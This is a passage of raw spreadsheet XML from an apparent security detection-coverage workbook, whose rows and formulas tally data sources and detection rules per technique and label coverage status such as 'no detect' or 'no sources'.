        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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82" t="s">
        <v>368</v>
      </c>
      <c r="U282" t="s">
        <v>1481</v>
      </c>
      <c r="V282" t="s">
        <v>1482</v>
      </c>
      <c r="W282" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="283" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A283" t="s">
        <v>1483</v>
      </c>
      <c r="B283" t="s">
        <v>1483</v>
      </c>
      <c r="C283" t="s">
        <v>216</v>
      </c>
      <c r="D283" t="s">
        <v>6</v>
      </c>
      <c r="E283" t="s">
        <v>1484</v>
      </c>
      <c r="F283" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G283" s="9" cm="1">
        <f t="array" ref="G283">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H283" s="9" cm="1">
        <f t="array" ref="H283">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I283" s="9" t="str" cm="1">
        <f t="array" ref="I283">IF(SUM(IF($C283=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C283=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J283" s="9" t="str" cm="1">
        <f t="array" ref="J28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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M283" s="9" cm="1">
        <f t="array" ref="M283">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N283" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O283" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P283" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S28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83" t="s">
        <v>386</v>
      </c>
      <c r="U283" t="s">
        <v>1485</v>
      </c>
      <c r="V283" t="s">
        <v>1486</v>
      </c>
      <c r="W283" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="284" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A284" t="s">
        <v>1487</v>
      </c>
      <c r="B284" t="s">
        <v>1487</v>
      </c>
      <c r="C284" t="s">
        <v>212</v>
      </c>
      <c r="D284" t="s">
        <v>6</v>
      </c>
      <c r="E284" t="s">
        <v>1488</v>
      </c>
      <c r="F284" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G284" s="9" cm="1">
        <f t="array" ref="G284">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H284" s="9" cm="1">
        <f t="array" ref="H284">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I284" s="9" t="str" cm="1">
        <f t="array" ref="I284">IF(SUM(IF($C284=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C284=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J284" s="9" t="str" cm="1">
        <f t="array" ref="J28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84" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M284" s="9" cm="1">
        <f t="array" ref="M284">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N284" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O284" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P284" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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84" t="s">
        <v>386</v>
      </c>
      <c r="U284" t="s">
        <v>1489</v>
      </c>
      <c r="V284" t="s">
        <v>1490</v>
      </c>
      <c r="W284" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="285" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A285" t="s">
        <v>1491</v>
      </c>
      <c r="B285" t="s">
        <v>1491</v>
      </c>
      <c r="C285" t="s">
        <v>145</v>
      </c>
      <c r="D285" t="s">
        <v>6</v>
      </c>
      <c r="E285" t="s">
        <v>1492</v>
      </c>
      <c r="F285" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G285" s="9" cm="1">
        <f t="array" ref="G285">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H285" s="9" cm="1">
        <f t="array" ref="H285">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I285" s="9" t="str" cm="1">
        <f t="array" ref="I285">IF(SUM(IF($C285=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C285=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J285" s="9" cm="1">
        <f t="array" ref="J28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285" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M285" s="9" cm="1">
        <f t="array" ref="M285">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N285" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O285" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P285" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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85" t="s">
        <v>368</v>
      </c>
      <c r="U285" t="s">
        <v>1493</v>
      </c>
      <c r="V285" t="s">
        <v>1494</v>
      </c>
      <c r="W285" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="286" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A286" t="s">
        <v>1491</v>
      </c>
      <c r="B286" t="s">
        <v>1495</v>
      </c>
      <c r="C286" t="s">
        <v>1496</v>
      </c>
      <c r="D286" t="s">
        <v>6</v>
      </c>
      <c r="E286" t="s">
        <v>1492</v>
      </c>
      <c r="F286" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G286" s="9" cm="1">
        <f t="array" ref="G286">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H286" s="9" t="str" cm="1">
        <f t="array" ref="H286">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I286" s="9" t="str" cm="1">
        <f t="array" ref="I286">IF(SUM(IF($C286=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C286=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J286" s="9" t="str" cm="1">
        <f t="array" ref="J28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86" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M286" s="9" cm="1">
        <f t="array" ref="M286">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N286" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O286" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P286" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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86" t="s">
        <v>386</v>
      </c>
      <c r="U286" t="s">
        <v>1497</v>
      </c>
      <c r="V286" t="s">
        <v>1498</v>
      </c>
      <c r="W286" t="b">
        <v>1</v>
      </c>
      <c r="X286" t="s">
        <v>1491</v>
      </c>
    </row>
    <row r="287" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A287" t="s">
        <v>1491</v>
      </c>
      <c r="B287" t="s">
        <v>1499</v>
      </c>
      <c r="C287" t="s">
        <v>1500</v>
      </c>
      <c r="D287" t="s">
        <v>6</v>
      </c>
      <c r="E287" t="s">
        <v>1501</v>
      </c>
      <c r="F287" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G287" s="9" cm="1">
        <f t="array" ref="G287">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H287" s="9" t="str" cm="1">
        <f t="array" ref="H287">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I287" s="9" t="str" cm="1">
        <f t="array" ref="I287">IF(SUM(IF($C287=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C287=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J287" s="9" t="str" cm="1">
        <f t="array" ref="J28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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M287" s="9" cm="1">
        <f t="array" ref="M287">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N287" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O287" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P287" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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87" t="s">
        <v>503</v>
      </c>
      <c r="U287" t="s">
        <v>1502</v>
      </c>
      <c r="V287" t="s">
        <v>1503</v>
      </c>
      <c r="W287" t="b">
        <v>1</v>
      </c>
      <c r="X287" t="s">
        <v>1491</v>
      </c>
    </row>
    <row r="288" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A288" t="s">
        <v>1504</v>
      </c>
      <c r="B288" t="s">
        <v>1504</v>
      </c>
      <c r="C288" t="s">
        <v>129</v>
      </c>
      <c r="D288" t="s">
        <v>6</v>
      </c>
      <c r="E288" t="s">
        <v>463</v>
      </c>
      <c r="F288" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G288" s="9" cm="1">
        <f t="array" ref="G288">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H288" s="9" cm="1">
        <f t="array" ref="H288">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I288" s="9" t="str" cm="1">
        <f t="array" ref="I288">IF(SUM(IF($C288=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C288=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J288" s="9" cm="1">
        <f t="array" ref="J28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288" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M288" s="9" cm="1">
        <f t="array" ref="M288">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N288" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O288" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P288" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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88" t="s">
        <v>368</v>
      </c>
      <c r="U288" t="s">
        <v>1505</v>
      </c>
      <c r="V288" t="s">
        <v>1506</v>
      </c>
      <c r="W288" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="289" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A289" t="s">
        <v>1504</v>
      </c>
      <c r="B289" t="s">
        <v>1507</v>
      </c>
      <c r="C289" t="s">
        <v>1508</v>
      </c>
      <c r="D289" t="s">
        <v>6</v>
      </c>
      <c r="E289" t="s">
        <v>463</v>
      </c>
      <c r="F289" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G289" s="9" cm="1">
        <f t="array" ref="G289">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H289" s="9" t="str" cm="1">
        <f t="array" ref="H289">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I289" s="9" t="str" cm="1">
        <f t="array" ref="I289">IF(SUM(IF($C289=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C289=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J289" s="9" t="str" cm="1">
        <f t="array" ref="J28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89" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M289" s="9" cm="1">
        <f t="array" ref="M289">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N289" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O289" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P289" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S28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89" t="s">
        <v>368</v>
      </c>
      <c r="U289" t="s">
        <v>1509</v>
      </c>
      <c r="V289" t="s">
        <v>1510</v>
      </c>
      <c r="W289" t="b">
        <v>1</v>
      </c>
      <c r="X289" t="s">
        <v>1504</v>
      </c>
    </row>
    <row r="290" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A290" t="s">
        <v>1504</v>
      </c>
      <c r="B290" t="s">
        <v>1511</v>
      </c>
      <c r="C290" t="s">
        <v>1512</v>
      </c>
      <c r="D290" t="s">
        <v>6</v>
      </c>
      <c r="E290" t="s">
        <v>1513</v>
      </c>
      <c r="F290" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G290" s="9" cm="1">
        <f t="array" ref="G290">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H290" s="9" t="str" cm="1">
        <f t="array" ref="H290">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I290" s="9" t="str" cm="1">
        <f t="array" ref="I290">IF(SUM(IF($C290=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C290=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J290" s="9" t="str" cm="1">
        <f t="array" ref="J29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90" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M290" s="9" cm="1">
        <f t="array" ref="M290">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N290" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O290" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P290" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S29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90" t="s">
        <v>368</v>
      </c>
      <c r="U290" t="s">
        <v>1514</v>
      </c>
      <c r="W290" t="b">
        <v>1</v>
      </c>
      <c r="X290" t="s">
        <v>1504</v>
      </c>
    </row>
    <row r="291" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A291" t="s">
        <v>1515</v>
      </c>
      <c r="B291" t="s">
        <v>1515</v>
      </c>
      <c r="C291" t="s">
        <v>138</v>
      </c>
      <c r="D291" t="s">
        <v>8</v>
      </c>
      <c r="E291" t="s">
        <v>1516</v>
      </c>
      <c r="F291" s="9">
        <f t="shared" si="4"/>
        <v>5</v>
      </c>
      <c r="G291" s="9" cm="1">
        <f t="array" ref="G291">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H291" s="9" cm="1">
        <f t="array" ref="H291">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I291" s="9" t="str" cm="1">
        <f t="array" ref="I291">IF(SUM(IF($C291=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C291=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J291" s="9" t="str" cm="1">
        <f t="array" ref="J29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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M291" s="9" cm="1">
        <f t="array" ref="M291">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N291" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O291" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P291" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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91" t="s">
        <v>386</v>
      </c>
      <c r="U291" t="s">
        <v>1517</v>
      </c>
      <c r="V291" t="s">
        <v>1518</v>
      </c>
      <c r="W291" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="292" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A292" t="s">
        <v>1519</v>
      </c>
      <c r="B292" t="s">
        <v>1519</v>
      </c>
      <c r="C292" t="s">
        <v>94</v>
      </c>
      <c r="D292" t="s">
        <v>747</v>
      </c>
      <c r="E292" t="s">
        <v>1520</v>
      </c>
      <c r="F292" s="9">
        <f t="shared" si="4"/>
        <v>5</v>
      </c>
      <c r="G292" s="9" cm="1">
        <f t="array" ref="G292">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H292" s="9" cm="1">
        <f t="array" ref="H292">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
